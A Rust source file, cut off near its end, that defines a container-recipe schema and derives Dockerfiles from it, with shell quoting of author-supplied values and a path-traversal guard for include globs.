//! The language-neutral recipe schema and its Dockerfile deriver.
//!
//! These `serde` structs are the canonical parse of the recipe wire format; the
//! Python `rlmesh.recipes` dataclasses are typed views with the identical JSON
//! shape (snake_case keys, a `kind`-tagged `make` union). `derive_dockerfile`
//! implements the build-field -> Dockerfile-instruction contract (spec section
//! 5A): the neutral conformance surface a non-Python deriver (a future capi
//! consumer) must reproduce, guarded by golden-file tests.
//!
//! The deriver covers the full build vocabulary: base (+a build-time python
//! detect/symlink for a base whose name does not advertise python),
//! env/pythonpath/gpu, apt (`system` united with
//! `system_runtime`), the author's `project` tree (`COPY` + editable install),
//! third-party `fetch` (pinned git clone / checksummed url download), pip or uv
//! install steps, a `run_as` user drop, raw `commands`, and the verbatim-
//! Dockerfile trapdoor. `from_recipe` is inlined by the registry layer before the
//! deriver runs. `ProjectInstall` requires its source tree to be staged into the
//! build context under [`PROJECT_CONTEXT_DIR`] by the caller.
//!
//! System packages (`system`/`system_runtime`) are installed with **apt**, so a
//! structured build targets a **Debian/Ubuntu** base; `render_system_packages` is
//! the single point to generalize to another distro, and `build.dockerfile` is the
//! escape hatch for a non-Debian base today.

use std::collections::BTreeMap;
use std::fs;
use std::path::{Path, PathBuf};

use anyhow::{Context as _, Result as AnyResult};
use serde::{Deserialize, Serialize};
use sha2::{Digest, Sha256};

use crate::{RecipeProvenance, ResolvedRlmeshPackage, hex, shell_quote};

const CONTAINER_PORT: u16 = 50051;
const WORKDIR: &str = "/opt/rlmesh";
const ENV_BOOTSTRAP: &str = "rlmesh._bootstrap.sandbox_env";
const MODEL_BOOTSTRAP: &str = "rlmesh._bootstrap.sandbox_model";

/// The container ENTRYPOINT for a recipe kind: env recipes serve an environment,
/// model recipes serve/drive a policy. `pub(crate)` so the gym/hf preamble in
/// `docker.rs` single-sources the env entrypoint through here too.
pub(crate) fn entrypoint_for(kind: &str) -> String {
    let module = if kind == "model" {
        MODEL_BOOTSTRAP
    } else {
        ENV_BOOTSTRAP
    };
    format!("ENTRYPOINT [\"python\", \"-m\", \"{module}\"]")
}

/// The build-context subdirectory a `ProjectInstall` source tree is staged into;
/// the deriver `COPY`s from here and `write_build_context` populates it.
pub const PROJECT_CONTEXT_DIR: &str = "project";
const DEFAULT_PROJECT_DEST: &str = "/opt/rlmesh/project";

/// The build-context subdirectory the resolved RLMesh wheel is staged into when
/// `rlmesh_package` is a local wheel; mirrors the gym/hf path in `docker.rs`.
pub const PACKAGE_CONTEXT_DIR: &str = "packages";

/// An error produced while deriving a Dockerfile from a recipe.
#[derive(Debug, thiserror::Error)]
pub enum DeriveError {
    /// An interpolated token contained a forbidden character (newline/CR/null).
    #[error("invalid Dockerfile token in {field}: control characters are not allowed")]
    InvalidToken {
        /// The recipe field the token came from.
        field: String,
    },
    /// A build field is not yet supported by this slice's deriver.
    #[error("recipe build field not yet supported by the deriver: {0}")]
    Unsupported(String),
    /// A build field is missing a value the deriver requires.
    #[error("recipe build field {0} is missing a required value")]
    MissingField(String),
}

/// The named factory (phase 3), tagged by `kind` in the wire format.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
#[serde(tag = "kind", rename_all = "snake_case")]
pub enum Make {
    /// A `gymnasium.make` factory.
    Gym {
        /// The gymnasium environment id.
        env_id: String,
        /// JSON-only factory kwargs.
        #[serde(default)]
        kwargs: BTreeMap<String, serde_json::Value>,
    },
    /// A `module:callable` Python factory.
    Py {
        /// The `module:callable` entrypoint.
        entrypoint: String,
        /// JSON-only factory kwargs.
        #[serde(default)]
        kwargs: BTreeMap<String, serde_json::Value>,
    },
    /// A Hugging Face-materialized factory.
    Hf {
        /// The source repo.
        repo: String,
        /// The pinned revision.
        #[serde(default)]
        revision: Option<String>,
        /// The suite selector.
        #[serde(default)]
        suite: Option<String>,
        /// The task selector.
        #[serde(default)]
        task: Option<String>,
        /// JSON-only factory kwargs.
        #[serde(default)]
        kwargs: BTreeMap<String, serde_json::Value>,
    },
}

/// One `pip install` step with its own index URLs (phase 1).
#[derive(Debug, Clone, Default, PartialEq, Eq, Serialize, Deserialize)]
#[serde(default)]
pub struct PipInstall {
    /// The packages to install.
    pub packages: Vec<String>,
    /// `--index-url` (replaces PyPI).
    pub index_url: Option<String>,
    /// `--extra-index-url` entries (additive).
    pub extra_index_urls: Vec<String>,
    /// `--no-deps`.
    pub no_deps: bool,
    /// `--pre`.
    pub pre: bool,
    /// `-r <path>` requirements file.
    pub requirements: Option<String>,
}

/// A third-party build-time acquisition (git clone or url download).
#[derive(Debug, Clone, Default, PartialEq, Eq, Serialize, Deserialize)]
#[serde(default)]
pub struct Fetch {
    /// `"git"` or `"url"`.
    pub kind: String,
    /// The git repo.
    pub repo: Option<String>,
    /// The pinned git ref.
    #[serde(rename = "ref")]
    pub ref_: Option<String>,
    /// The destination path.
    pub dest: String,
    /// Run `pip install -e <dest>` after clone.
    pub pip_install: bool,
    /// `pip install -r <dest>/<file>` before the editable install.
    pub pip_requirements: Option<String>,
    /// The download url.
    pub url: Option<String>,
    /// The download sha256.
    pub sha256: Option<String>,
}

/// Install the recipe author's own package source tree (phase 1).
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
#[serde(default)]
pub struct ProjectInstall {
    /// The host path relative to the context root.
    pub src: String,
    /// The image install root.
    pub dest: String,
    /// `pip install -e` vs `pip install`.
    pub editable: bool,
    /// Extra non-code globs to carry.
    pub include: Vec<String>,
}

impl Default for ProjectInstall {
    fn default() -> Self {
        Self {
            src: ".".to_string(),
            dest: String::new(),
            editable: true,
            include: Vec::new(),
        }
    }
}

/// Phase 1 -- the typed Dockerfile.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
#[serde(default)]
pub struct Build {
    /// `FROM` image (None -> [`crate::DEFAULT_BASE_IMAGE`]).
    pub base: Option<String>,
    /// Registry reuse: the name of a recipe whose build is inlined.
    pub from_recipe: Option<String>,
    /// Compile-time apt packages.
    pub system: Vec<String>,
    /// Runtime apt packages.
    pub system_runtime: Vec<String>,
    /// Ordered pip steps.
    pub pip: Vec<PipInstall>,
    /// The author's own package install.
    pub project: Option<ProjectInstall>,
    /// Third-party git clones / downloads.
    pub fetch: Vec<Fetch>,
    /// `ENV` baked into the image.
    pub env: BTreeMap<String, String>,
    /// Appended to `ENV PYTHONPATH`.
    pub pythonpath: Vec<String>,
    /// `--gpus all` at run + `NVIDIA_DRIVER_CAPABILITIES` baked in.
    pub gpu: bool,
    /// `"pip"` or `"uv"`.
    pub installer: String,
    /// `USER <uid>` drop at the end.
    pub run_as: Option<u32>,
    /// Auto C toolchain inclusion (unused by this slice's renderer).
    pub toolchain: Option<bool>,
    /// Escape-hatch raw `RUN sh -lc` commands, appended last.
    pub commands: Vec<String>,
    /// A verbatim Dockerfile body emitted as-is (the superset trapdoor).
    pub dockerfile: Option<String>,
}

impl Default for Build {
    fn default() -> Self {
        Self {
            base: None,
            from_recipe: None,
            system: Vec::new(),
            system_runtime: Vec::new(),
            pip: Vec::new(),
            project: None,
            fetch: Vec::new(),
            env: BTreeMap::new(),
            pythonpath: Vec::new(),
            gpu: false,
            installer: "pip".to_string(),
            run_as: None,
            toolchain: None,
            commands: Vec::new(),
            dockerfile: None,
        }
    }
}

/// A construct-time file write (phase 2).
#[derive(Debug, Clone, Default, PartialEq, Eq, Serialize, Deserialize)]
#[serde(default)]
pub struct FileWrite {
    /// The destination path.
    pub path: String,
    /// The file contents.
    pub contents: String,
    /// Write only when the file does not already exist.
    pub if_absent: bool,
}

/// Construct-time DATA: env updates + file writes (phase 2).
#[derive(Debug, Clone, Default, PartialEq, Eq, Serialize, Deserialize)]
#[serde(default)]
pub struct Setup {
    /// `os.environ` updates applied before `requires.imports`.
    pub env: BTreeMap<String, String>,
    /// File writes.
    pub files: Vec<FileWrite>,
    /// Allowlist of `setup.env` keys a member may override at runtime via
    /// `RLMESH_PARAMS_JSON`. Runtime-only: the deriver ignores it and it is
    /// excluded from `build_hash` (it lives under the runtime `setup` phase), so
    /// one image serves every declared member. Appended last for golden stability.
    pub params: Vec<String>,
}

/// Registration imports (gym/hf only).
#[derive(Debug, Clone, Default, PartialEq, Eq, Serialize, Deserialize)]
#[serde(default)]
pub struct Requires {
    /// Registration side-effect imports.
    pub imports: Vec<String>,
}

fn default_recipe_version() -> u32 {
    1
}

/// An inert environment recipe.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct Recipe {
    /// The `namespace/name` identifier.
    pub name: String,
    /// The named factory (None for a build-only base).
    #[serde(default)]
    pub make: Option<Make>,
    /// The build phase.
    #[serde(default)]
    pub build: Build,
    /// The setup phase.
    #[serde(default)]
    pub setup: Setup,
    /// The registration imports.
    #[serde(default)]
    pub requires: Requires,
    /// A human-readable summary.
    #[serde(default)]
    pub summary: Option<String>,
    /// Forward field: the published adapter (an env recipe's tags or a model
    /// recipe's spec), carried verbatim for round-trip fidelity.
    #[serde(default)]
    pub adapter: Option<serde_json::Value>,
    /// The schema version.
    #[serde(default = "default_recipe_version")]
    pub recipe_version: u32,
    /// The recipe kind ("env" or "model"); selects the container entrypoint.
    #[serde(default = "default_kind")]
    pub kind: String,
}

fn default_kind() -> String {
    "env".to_string()
}

impl Recipe {
    /// Parse a recipe from its canonical JSON wire format. Parsing executes nothing.
    pub fn from_json(payload: &str) -> Result<Self, serde_json::Error> {
        serde_json::from_str(payload)
    }
}

/// Reject control characters; every other character is neutralized by
/// [`shell_quote`] at the point of interpolation (defense in depth).
fn validate_token(field: &str, value: &str) -> Result<(), DeriveError> {
    if value.contains(['\n', '\r', '\0']) {
        return Err(DeriveError::InvalidToken {
            field: field.to_string(),
        });
    }
    Ok(())
}

/// Derive a Dockerfile from a recipe (spec section 5A).
///
/// `base_image` and `rlmesh_package` are the values already resolved upstream by
/// [`crate::EffectiveSandboxSpec`] (which also feeds them into the build hash):
/// `base_image` has the `build.base`-wins-else-caller-override precedence folded
/// in, and `rlmesh_package` is the resolved pip-spec-or-staged-wheel install ref.
/// Passing them in (rather than re-reading `recipe.build.base` / hardcoding
/// `pip install rlmesh`) keeps the Dockerfile in agreement with the build hash.
/// `packages` are the extra caller-supplied pip packages from `SandboxEnv`.
///
/// `provenance` gates the implicit unpinned `gymnasium` install: an `Installed`
/// recipe gets it for free (the convenience the gym/hf paths also bake in).
/// A `Remote` recipe is fully pinned and digest pinned upstream, so it must not
/// receive a mutable PyPI resolve. A remote recipe that needs gymnasium declares
/// a pinned `gymnasium==X` in `build.pip`.
///
/// Ordering: `FROM` -> `ENV` -> `WORKDIR` -> `COPY packages` -> apt (system
/// packages) -> build-time python detection (a non-`python` base self-installs
/// python3/pip and a `python` symlink only when it lacks them) -> early uv
/// bootstrap (for `installer="uv"`, so `project`/`fetch` can use `uv pip
/// install`) -> `project` -> `fetch` -> the pip/uv chain -> `commands` ->
/// `run_as` -> `EXPOSE`/`ENTRYPOINT`.
pub(crate) fn derive_dockerfile(
    recipe: &Recipe,
    base_image: &str,
    rlmesh_package: &ResolvedRlmeshPackage,
    packages: &[String],
    provenance: RecipeProvenance,
) -> Result<String, DeriveError> {
    let build = &recipe.build;

    // The verbatim-Dockerfile trapdoor: emit the body as-is, ENTRYPOINT appended
    // last (spec 7.1H). The Python schema already guarantees this is exclusive
    // with the structured build fields.
    if let Some(body) = &build.dockerfile {
        // The body is a multi-line verbatim Dockerfile (Installed-provenance only),
        // so newlines are expected; only a null byte is rejected.
        if body.contains('\0') {
            return Err(DeriveError::InvalidToken {
                field: "build.dockerfile".to_string(),
            });
        }
        let mut out = body.trim_end().to_string();
        out.push_str("\n\n");
        // Self-describing image: bake the recipe's runtime half so the entrypoint
        // can load it with no inline payload, exactly as the structured path does.
        // COPY creates the parent dir, so this is independent of the body's WORKDIR.
        out.push_str(&format!("COPY recipe.json {WORKDIR}/recipe.json\n"));
        out.push_str(&format!("ENV RLMESH_RECIPE_PATH={WORKDIR}/recipe.json\n\n"));
        out.push_str(&entrypoint_for(&recipe.kind));
        out.push('\n');
        return Ok(out);
    }

    // `from_recipe` is inlined into the child by the registry layer before the
    // wire, so the deriver should never see it.
    if build.from_recipe.is_some() {
        return Err(DeriveError::Unsupported("from_recipe".to_string()));
    }
    if build.installer != "pip" && build.installer != "uv" {
        return Err(DeriveError::Unsupported(format!(
            "installer={}",
            build.installer
        )));
    }
    let verb = install_verb(&build.installer);

    // `base_image` already folds in the `build.base`-wins-else-caller-override
    // precedence (resolved upstream and hashed); do not re-read `build.base`.
    let base = base_image;
    validate_token("build.base", base)?;

    let mut out = String::new();
    out.push_str("# syntax=docker/dockerfile:1.7\n\n");
    out.push_str(&format!("FROM {base}\n\n"));

    // ENV block: standard vars, then gpu caps, then build.env, then PYTHONPATH.
    // RLMESH_PORT is the canonical bind port; RLMESH_ENV_PORT is the deprecated
    // alias the bootstraps still read after it.
    out.push_str(&format!("ENV RLMESH_PORT={CONTAINER_PORT}\n"));
    out.push_str(&format!("ENV RLMESH_ENV_PORT={CONTAINER_PORT}\n"));
    out.push_str("ENV PYTHONUNBUFFERED=1\n");
    if build.gpu {
        out.push_str("ENV NVIDIA_DRIVER_CAPABILITIES=all\n");
    }
    for (key, value) in &build.env {
        validate_token("build.env key", key)?;
        validate_token("build.env value", value)?;
        out.push_str(&format!("ENV {key}={value}\n"));
    }
    if !build.pythonpath.is_empty() {
        for entry in &build.pythonpath {
            validate_token("build.pythonpath", entry)?;
        }
        out.push_str(&format!("ENV PYTHONPATH={}\n", build.pythonpath.join(":")));
    }
    out.push('\n');

    out.push_str(&format!("WORKDIR {WORKDIR}\n\n"));

    // A locally-built RLMesh wheel is staged into the build context's packages/
    // dir by write_build_context; COPY it in so render_pip_chain can install it
    // from the install_ref path (mirrors the gym/hf path in docker.rs).
    if rlmesh_package.source_path().is_some() {
        out.push_str(&format!(
            "COPY {PACKAGE_CONTEXT_DIR} /opt/rlmesh/packages\n\n"
        ));
    }

    // system packages: system union system_runtime, order-preserving dedup, one
    // layer. A `fetch` needs its tool on PATH BEFORE its RUN, so fold in `git`
    // (for a git fetch) / `curl` (for a url fetch) when the author did not list
    // it -- appended after the author's union to keep the order deterministic.
    let mut apt = union_preserving_order(&build.system, &build.system_runtime);
    for tool in fetch_tools(&build.fetch) {
        if !apt.iter().any(|name| name.as_str() == tool) {
            apt.push(tool.to_string());
        }
    }
    out.push_str(&render_system_packages(&apt)?);

    // A base whose name lacks "python" might be a bare CUDA base with no
    // interpreter or a python-capable image whose tag just does not say so (for
    // example, `nvcr.io/nvidia/pytorch:*-py3` or `nvidia/isaac-lab:*`). Detect
    // python at build time instead of installing unconditionally: these RUNs no-op on an
    // image that already ships python3/python (so the image's own interpreter and
    // preinstalled packages are left untouched) and install/symlink only on a
    // bare base. Emitted after apt and before the uv bootstrap / project / fetch /
    // pip chain so `python -m pip install` resolves from here on.
    if base_is_non_python(base) {
        out.push_str(
            "RUN command -v python3 >/dev/null 2>&1 || (apt-get update && apt-get install -y --no-install-recommends python3 python3-pip && rm -rf /var/lib/apt/lists/*)\n",
        );
        out.push_str(
            "RUN command -v python >/dev/null 2>&1 || ln -sf \"$(command -v python3)\" /usr/local/bin/python\n\n",
        );
    }

    // installer=="uv": bootstrap uv with pip before any `uv pip install` runs.
    // `render_project` / `render_fetch` use `uv pip install`, but `render_pip_chain`
    // is where uv would otherwise be installed afterward, so a project or a
    // pip-installing fetch would hit `uv: not found`. Emit the bootstrap early;
    // render_pip_chain then starts at the rlmesh
    // install for uv (the pip path keeps bootstrapping pip inside its own RUN).
    if build.installer == "uv" {
        out.push_str("RUN python -m pip install --no-cache-dir uv\n\n");
    }

    // project: COPY the author's staged tree then install it (editable by default).
    if let Some(project) = &build.project {
        out.push_str(&render_project(project, verb)?);
    }

    // fetch: third-party git clones / url downloads, each a pinned RUN.
    for fetch in &build.fetch {
        out.push_str(&render_fetch(fetch, verb)?);
    }

    // pip: the stock preamble (rlmesh, plus an implicit gymnasium for Installed
    // provenance only), then each recipe step, then the caller's extra `packages`.
    out.push_str(&format!(
        "RUN {}\n\n",
        render_pip_chain(
            &build.pip,
            &build.installer,
            rlmesh_package,
            packages,
            provenance,
        )?
    ));

    // commands: raw escape-hatch RUNs, appended last (Installed-only upstream).
    for command in &build.commands {
        validate_token("build.commands", command)?;
        out.push_str(&format!("RUN sh -lc {}\n", shell_quote(command)));
    }
    if !build.commands.is_empty() {
        out.push('\n');
    }

    // run_as: create the user and drop to it.
    if let Some(uid) = build.run_as {
        out.push_str(&format!(
            "RUN useradd --create-home --uid {uid} rlmesh && chown -R {uid} {WORKDIR}\n"
        ));
        out.push_str(&format!("USER {uid}\n\n"));
    }

    // Self-describing image: bake the recipe's runtime half so the entrypoint can
    // load it with no inline payload. `write_build_context` stages this file as a
    // Dockerfile sibling (NEVER under build.project.src -- its content must stay
    // out of the build-context digest, or one-image-many-members breaks).
    out.push_str(&format!("COPY recipe.json {WORKDIR}/recipe.json\n"));
    out.push_str(&format!("ENV RLMESH_RECIPE_PATH={WORKDIR}/recipe.json\n\n"));

    out.push_str(&format!("EXPOSE {CONTAINER_PORT}\n"));
    out.push_str(&entrypoint_for(&recipe.kind));
    out.push('\n');
    Ok(out)
}

/// A cheap "this base definitely ships python" fast-path: an image whose name
/// contains "python" (e.g. `python:3.11-slim`) surely has an interpreter, so the
/// deriver emits nothing extra. A `false` result is not a verdict that python is
/// absent; it only means we cannot tell from the name (a bare CUDA base has no
/// python, but a pytorch/isaac image does despite a name that lacks "python"), so
/// the caller emits build-time `command -v` detection rather than installing
/// unconditionally.
fn base_is_non_python(base: &str) -> bool {
    let image = base.rsplit('/').next().unwrap_or(base);
    !image.contains("python")
}

/// The per-package install command prefix for the chosen installer.
fn install_verb(installer: &str) -> &'static str {
    match installer {
        "uv" => "uv pip install --system --no-cache-dir",
        _ => "python -m pip install --no-cache-dir",
    }
}

/// The apt packages a recipe's `fetch` steps need on PATH before they RUN:
/// `git` if any fetch clones a repo, `curl` if any fetch downloads a url. Git
/// precedes curl for a deterministic order; the caller dedups against any tool
/// the author already listed. Stays within the Debian/apt assumption (a
/// non-Debian base uses the `build.dockerfile` trapdoor).
fn fetch_tools(fetches: &[Fetch]) -> Vec<&'static str> {
    let mut tools = Vec::new();
    if fetches.iter().any(|fetch| fetch.kind == "git") {
        tools.push("git");
    }
    if fetches.iter().any(|fetch| fetch.kind == "url") {
        tools.push("curl");
    }
    tools
}

/// Union two system-package lists preserving first-occurrence order.
fn union_preserving_order(first: &[String], second: &[String]) -> Vec<String> {
    let mut seen = std::collections::BTreeSet::new();
    let mut out = Vec::new();
    for name in first.iter().chain(second.iter()) {
        if seen.insert(name.clone()) {
            out.push(name.clone());
        }
    }
    out
}

/// Render the system-package install step.
///
/// **Debian/Ubuntu assumption -- the single point to generalize.** The default
/// renderer installs `system`/`system_runtime` with `apt`, so a structured build
/// targets a Debian/Ubuntu base (the default `python:3.11-slim` and the `nvidia/
/// cuda` images are). To support another distro, generalize HERE: add an additive
/// `Build.package_manager` (`serde(default)` = `apt`, backward-compatible) or infer
/// it from the base image and branch on it -- the schema/wire format does not
/// change, because `system`/`system_runtime` are neutral package-name lists. Until
/// then, a non-Debian base uses the `build.dockerfile` trapdoor or `build.commands`.
/// (A future `package_manager` field would change `build_hash`, forcing a one-time
/// rebuild; if a persistent image catalog exists by then, omit default-valued build
/// fields from the hash.)
fn render_system_packages(names: &[String]) -> Result<String, DeriveError> {
    if names.is_empty() {
        return Ok(String::new());
    }
    let mut quoted = Vec::with_capacity(names.len());
    for name in names {
        validate_token("build.system", name)?;
        quoted.push(shell_quote(name));
    }
    Ok(format!(
        "RUN apt-get update && apt-get install -y --no-install-recommends {} && rm -rf /var/lib/apt/lists/*\n\n",
        quoted.join(" ")
    ))
}

/// Render the `COPY` + install for a [`ProjectInstall`] (the author's own tree).
fn render_project(project: &ProjectInstall, verb: &str) -> Result<String, DeriveError> {
    let dest = if project.dest.is_empty() {
        DEFAULT_PROJECT_DEST
    } else {
        validate_token("project.dest", &project.dest)?;
        &project.dest
    };
    let editable = if project.editable { " -e" } else { "" };
    Ok(format!(
        "COPY {PROJECT_CONTEXT_DIR} {dest}\nRUN {verb}{editable} {}\n\n",
        shell_quote(dest)
    ))
}

/// Render one third-party [`Fetch`] as a single pinned `RUN`.
fn render_fetch(fetch: &Fetch, verb: &str) -> Result<String, DeriveError> {
    match fetch.kind.as_str() {
        "git" => {
            let repo = fetch
                .repo
                .as_deref()
                .ok_or_else(|| DeriveError::MissingField("fetch.repo".to_string()))?;
            let dest = nonempty(&fetch.dest, "fetch.dest")?;
            validate_token("fetch.repo", repo)?;
            validate_token("fetch.dest", dest)?;
            let (repo_q, dest_q) = (shell_quote(repo), shell_quote(dest));
            // When a ref is pinned, fetch it directly into a fresh repo rather
            // than shallow-cloning the default branch first and fetching the ref
            // on top: that pattern wastes a clone and fails on servers that will
            // not serve an unreachable SHA. With no ref, a plain shallow clone of
            // the default branch is correct.
            let mut chain = if let Some(git_ref) = &fetch.ref_ {
                validate_token("fetch.ref", git_ref)?;
                let ref_q = shell_quote(git_ref);
                format!(
                    "git init {dest_q} && git -C {dest_q} remote add origin {repo_q} && git -C {dest_q} fetch --depth=1 origin {ref_q} && git -C {dest_q} checkout FETCH_HEAD"
                )
            } else {
                format!("git clone --depth=1 {repo_q} {dest_q}")
            };
            if let Some(req) = &fetch.pip_requirements {
                validate_token("fetch.pip_requirements", req)?;
                // Quote the WHOLE `dest/req` path as one shell argument. `req`
                // is author-supplied and `validate_token` only rejects control
                // characters, so an unquoted interpolation would let `req`
                // smuggle a `;`/`|`/`$()` shell command into the build RUN.
                chain.push_str(&format!(
                    " && {verb} -r {}",
                    shell_quote(&format!("{dest}/{req}"))
                ));
            }
            if fetch.pip_install {
                chain.push_str(&format!(" && {verb} -e {dest_q}"));
            }
            chain.push_str(&format!(" && rm -rf {dest_q}/.git"));
            Ok(format!("RUN {chain}\n\n"))
        }
        "url" => {
            let url = fetch
                .url
                .as_deref()
                .ok_or_else(|| DeriveError::MissingField("fetch.url".to_string()))?;
            let dest = nonempty(&fetch.dest, "fetch.dest")?;
            validate_token("fetch.url", url)?;
            validate_token("fetch.dest", dest)?;
            let (url_q, dest_q) = (shell_quote(url), shell_quote(dest));
            let mut chain = format!("curl -fsSL {url_q} -o {dest_q}");
            if let Some(sha256) = &fetch.sha256 {
                validate_token("fetch.sha256", sha256)?;
                chain.push_str(&format!(
                    " && echo {} | sha256sum -c -",
                    shell_quote(&format!("{sha256}  {dest}"))
                ));
            }
            Ok(format!("RUN {chain}\n\n"))
        }
        other => Err(DeriveError::Unsupported(format!("fetch.kind={other}"))),
    }
}

fn nonempty<'a>(value: &'a str, field: &str) -> Result<&'a str, DeriveError> {
    if value.is_empty() {
        Err(DeriveError::MissingField(field.to_string()))
    } else {
        Ok(value)
    }
}

/// Render the single pip `RUN` chain: installer preamble (rlmesh, plus an
/// implicit gymnasium for `Installed` provenance only), each [`PipInstall`] step,
/// then the caller's extra `packages`.
///
/// For `installer="uv"`, uv is bootstrapped earlier in [`derive_dockerfile`]
/// (before `project`/`fetch`, which also install through uv), so this chain
/// starts directly at the rlmesh install; the pip path keeps its `--upgrade pip`
/// bootstrap inside this RUN.
fn render_pip_chain(
    steps: &[PipInstall],
    installer: &str,
    rlmesh_package: &ResolvedRlmeshPackage,
    packages: &[String],
    provenance: RecipeProvenance,
) -> Result<String, DeriveError> {
    let verb = install_verb(installer);
    let mut parts = Vec::new();
    if installer != "uv" {
        // uv is bootstrapped early in derive_dockerfile; pip upgrades itself here.
        parts.push("python -m pip install --no-cache-dir --upgrade pip".to_string());
    }
    // Install the upstream-resolved RLMesh package (a pip spec like
    // `rlmesh==X` or the COPY'd local wheel's install path), not a hardcoded
    // `rlmesh`, so the Dockerfile agrees with the build hash. This is the host's
    // resolved spec, not recipe-controlled, so it installs for every provenance.
    let install_ref = rlmesh_package.install_ref();
    validate_token("rlmesh_package", install_ref)?;
    parts.push(format!("{verb} {}", shell_quote(install_ref)));
    // The implicit unpinned `gymnasium` is a convenience for `Installed` recipes
    // (mirroring the gym/hf paths). A `Remote` recipe is forced fully-pinned by
    // the upstream reproducibility gate, so injecting a mutable PyPI resolve here
    // would bypass it: skip the implicit install and let the recipe declare a
    // pinned `gymnasium==X` in `build.pip` itself.
    if provenance == RecipeProvenance::Installed {
        parts.push(format!("{verb} gymnasium"));
    }
    for step in steps {
        parts.push(render_pip_step(step, verb)?);
    }
    // The caller's extra `packages` from SandboxEnv
    // install last, in their own line, mirroring the gym/hf path in docker.rs.
    if !packages.is_empty() {
        let mut line = verb.to_string();
        for package in packages {
            validate_token("packages", package)?;
            line.push(' ');
            line.push_str(&shell_quote(package));
        }
        parts.push(line);
    }
    Ok(parts.join(" && "))
}

/// Render one install line with its own index/flag arguments.
fn render_pip_step(step: &PipInstall, verb: &str) -> Result<String, DeriveError> {
    let mut line = verb.to_string();
    if let Some(index_url) = &step.index_url {
        validate_token("pip.index_url", index_url)?;
        line.push_str(&format!(" --index-url {}", shell_quote(index_url)));
    }
    for extra in &step.extra_index_urls {
        validate_token("pip.extra_index_urls", extra)?;
        line.push_str(&format!(" --extra-index-url {}", shell_quote(extra)));
    }
    if step.no_deps {
        line.push_str(" --no-deps");
    }
    if step.pre {
        line.push_str(" --pre");
    }
    if let Some(requirements) = &step.requirements {
        validate_token("pip.requirements", requirements)?;
        line.push_str(&format!(" -r {}", shell_quote(requirements)));
    }
    for package in &step.packages {
        validate_token("pip.packages", package)?;
        line.push(' ');
        line.push_str(&shell_quote(package));
    }
    Ok(line)
}

/// An error produced while resolving a [`ProjectInstall::include`] glob.
#[derive(Debug, thiserror::Error)]
pub enum IncludeError {
    /// Walking the project tree to match an include glob failed.
    #[error("failed to resolve include {pattern:?}: {source}")]
    Io {
        /// The include pattern being resolved.
        pattern: String,
        /// The underlying filesystem error.
        source: std::io::Error,
    },
    /// An include match resolved to a path outside the project root (a
    /// path-traversal attempt via `..` or a symlink escaping the tree).
    #[error("include {pattern:?} matched a path escaping the project root: {path}")]
    Escapes {
        /// The include pattern being resolved.
        pattern: String,
        /// The offending real path.
        path: String,
    },
}

/// One matched include entry: the on-disk path (under the project root) and its
/// path relative to that root, which is the layout staged under
/// [`PROJECT_CONTEXT_DIR`] and the key folded into the content digest.
#[derive(Debug, Clone, PartialEq, Eq, PartialOrd, Ord)]
pub struct IncludeMatch {
    /// The matched path on disk (a file or directory under the project root).
    pub path: PathBuf,
    /// The matched path relative to the project root (its staged layout).
    pub relative: PathBuf,
}

/// Resolve a recipe's [`ProjectInstall::include`] globs, returning the matched
/// files and directories sorted and deduplicated so staging and hashing fold in
/// the *same* entries in the *same* order.
///
/// Globs resolve against `project_root` (`context_root.join(project.src)`). The
/// path-traversal guard root is `context_root`: every match's *real* path
/// (symlinks resolved) must stay within the real `context_root`, so a pattern
/// may use `..` to reach a sibling above `src` (e.g. `../assets/**`, the shape
/// the Python schema documents) but cannot escape the build context. Anything
/// escaping `context_root` is a hard [`IncludeError::Escapes`].
///
/// Each match's staged layout ([`IncludeMatch::relative`]) is its path relative
/// to `project_root`; a match reached above `project_root` via `..` is staged at
/// its path relative to `context_root` instead (so it lands *inside* the project
/// dir rather than climbing out of it). For the common `src == "."` case the two
/// coincide.
///
/// Supported glob subset (documented, intentionally minimal, with no `glob`
/// crate dependency): each pattern is `/`-split into segments matched against the tree
/// segment-by-segment. A segment may be a literal, contain `*` (matches any run
/// of non-`/` characters within a single path segment), or be exactly `**`
/// (matches zero or more whole path segments). So `assets/**`, `*.json`,
/// `data/*`, and `configs/**/*.yaml` all work. A `.`/`..` segment is honored.
pub fn resolve_includes(
    project_root: &Path,
    context_root: &Path,
    includes: &[String],
) -> Result<Vec<IncludeMatch>, IncludeError> {
    if includes.is_empty() {
        return Ok(Vec::new());
    }
    // The real context root anchors the traversal guard; the real project root
    // anchors the staged layout. A non-existent project root simply matches
    // nothing.
    let (real_context, real_project) = match (
        std::fs::canonicalize(context_root),
        std::fs::canonicalize(project_root),
    ) {
        (Ok(context), Ok(project)) => (context, project),
        _ => return Ok(Vec::new()),
    };

    // Matches are stored as canonical (symlink-resolved) real paths, guaranteed
    // under `real_context` by the guard, so the relative layout strips cleanly
    // even for patterns that traversed through `..`.
    let mut matches = std::collections::BTreeSet::new();
    for pattern in includes {
        let segments: Vec<&str> = pattern.split('/').filter(|seg| !seg.is_empty()).collect();
        match_glob(
            project_root,
            &segments,
            pattern,
            &real_context,
            &mut matches,
        )?;
    }
    // Prune any match nested under another matched directory so each entry is
    // staged/hashed exactly once via the consumer's recursive tree-walk. Matches
    // are sorted, so a parent dir precedes its descendants: keep a match only
    // when the last-kept entry is not a prefix of it.
    let mut kept: Vec<PathBuf> = Vec::new();
    for path in matches {
        if kept.last().is_some_and(|parent| path.starts_with(parent)) {
            continue;
        }
        kept.push(path);
    }

    Ok(kept
        .into_iter()
        .map(|path| {
            // Prefer a project-root-relative layout; fall back to context-root-
            // relative for an above-src match so the staged path stays inside the
            // project dir.
            let relative = path
                .strip_prefix(&real_project)
                .or_else(|_| path.strip_prefix(&real_context))
                .unwrap_or(path.as_path())
                .to_path_buf();
            IncludeMatch { path, relative }
        })
        .collect())
}

/// Compute a content digest of the recipe's `ProjectInstall` source tree (7.1A),
/// resolved against `context_root`. Returns None when there is nothing to stage.
pub(crate) fn recipe_content_digest(
    recipe: Option<&Recipe>,
    context_root: Option<&Path>,
) -> AnyResult<Option<String>> {
    let Some(recipe) = recipe else {
        return Ok(None);
    };
    let Some(project) = &recipe.build.project else {
        return Ok(None);
    };
    let Some(root) = context_root else {
        anyhow::bail!("recipe ProjectInstall requires a context_root to stage from");
    };
    let src = root.join(&project.src);
    let mut hasher = Sha256::new();
